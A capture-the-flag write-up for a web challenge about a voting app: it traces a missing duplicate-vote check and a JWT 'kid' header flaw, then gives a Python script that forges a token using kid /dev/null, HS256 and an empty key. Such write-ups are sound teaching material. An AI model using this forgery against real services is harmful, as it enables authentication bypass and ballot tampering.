# The voting logs ain't making sense - web

## Challenge

A paranormal event was observed during the voting. Apparently multiple successful vote submissions were starting to be observed in the logs for an individual and votes for citizens that don't exist? Can you find out how an attacker may have done this and submit a vote for the citizen ID CIT1337 who has already voted?

## Solve

Observing the code base we can see:

- We can generate a JWT with values of our choosing with the admin API `generate_qr_code()`:

```py
@admin_bp.route("/generate-qr", methods=["POST"])
@require_polling_key
def generate_qr_code():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        citizen_id = data.get("citizen_id")
        name = data.get("name")
        state = data.get("state")

        if not all([citizen_id, name, state]):
            return jsonify({"error": "Missing required fields: citizen_id, name, state"}), 400

        db = Database()
        if db.citizen_has_voted(citizen_id):
            return jsonify({"error": f"Citizen '{citizen_id}' has already voted"}), 400

        token = create_jwt_token(citizen_id, name, state, current_app.config["JWT_PRIVATE_KEY_PATH"])
        qr_code_base64 = generate_qr_image(token)

        return jsonify({
            "qr_code": qr_code_base64,
            "token": token
        })

    except Exception as e:
        return jsonify({"error": f"Failed to generate QR code: {str(e)}"}), 500
```

However, if we attempt to generate a JWT for `CIT1337`, we run in to `db.citizen_has_voted()`:

```py
def citizen_has_voted(self, citizen_id):
        conn = self.get_connection()
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM votes WHERE citizen_id=?", (citizen_id,))
            rows = cursor.fetchall()
            
            return len(rows) != 0
        except Exception as e:
            raise e
        finally:
            conn.close()
```

- We can submit votes with `submit_vote()` using the voting API `/submit-vote` endpoint:

```py
@voting_bp.route("/submit-vote", methods=["POST"])
def submit_vote():
    """
    Citizen submits a vote for their chosen party
    """
    try:
        auth_header = request.headers.get("Authorization")
        if not auth_header:
            return jsonify({"error": "Missing Authorization header"}), 401
            
        payload = decode_jwt_token(auth_header)
        if not payload:
            return jsonify({"error": "Invalid or expired token"}), 401
            
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400
            
        party = data.get("party")
        if not party:
            return jsonify({"error": "Missing required field: party"}), 400
            
        citizen_id = payload.get("citizenId")
        name = payload.get("name")
        state = payload.get("state")
        vote_identifier = payload.get("vote_identifier")
        
        if not all([citizen_id, name, state, vote_identifier]):
            return jsonify({"error": "Invalid token payload"}), 401
            
        db = Database()
        success = db.submit_vote(citizen_id, party, state, vote_identifier)
        
        if success:
            response_data = {
                "success": True,
                "message": "Vote submitted successfully",
                "citizen_id": citizen_id,
                "party": party,
                "state": state
            }
```

The key here is that `citizen_has_voted()` is never called in `submit_vote()` - meaning that if we can obtain a valid JWT for `CIT1337`, `submit_vote()` will process it without checking if a duplicate exists.

- In `create_jwt_token()` we can see that the key id or `kid` header parameter is included and points the server towards the public key file to use when verifying signatures:

```py
def create_jwt_token(citizen_id, name, state, private_key_path):
    payload = {
        "citizenId": citizen_id,
        "name": name,
        "state": state,
        "vote_identifier": os.urandom(32).hex(),
        "iat": int(datetime.now().timestamp()),
        "exp": int((datetime.now() + timedelta(hours=24)).timestamp())
    }

    headers = {}
    # Public keys don"t have an extension while private key does. Kid value will be public key.
    public_key_path = private_key_path.replace(".priv", "")
    headers["kid"] = public_key_path
    key_file_path = private_key_path

    with open(key_file_path, "r") as key_file:
        private_key = key_file.read()

    token = jwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers=headers
    )

    return token
```

This [blog post](https://www.vaadata.com/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/) describes how a user controlled `kid` parameter can lead to vulnerabilities if there is file upload / known files on the local server. Since we don't know whether file upload is possible, we:
- Generate a valid JWT with any values using `generate-qr()` 
- Decode the JWT, changing:
  -  `kid` header parameter to `/dev/null`
  -  `alg` header parameter to a symmetric algorithm (e.g `HS256`) 
  -  `citizen_id` to `CIT1337`
- Create a new JWT with the updated values and sign with an empty key:

```py
import jwt

payload = {
  "citizenId": "CIT1337",
  "name": "any",
  "state": "any",
  "vote_identifier": "fc2396184b4111ebd7c280fcaf58a54884230dd4a42924f48643fc45e3c25ee3",
  "iat": 1754193048,
  "exp": 1754279448
}
headers = { "kid": "/dev/null", "alg": "HS256" }

token = jwt.encode(payload, key='', algorithm='HS256', headers=headers)
print(token)
```

Now, if the server attempts to validate the JWT with `/dev/null` as the key, and it matches, it will decode the JWT with an empty string and consider our forged JWT valid. And it works!

`cysea{you_got_to_be_KIDding_me_b60c85395d}`
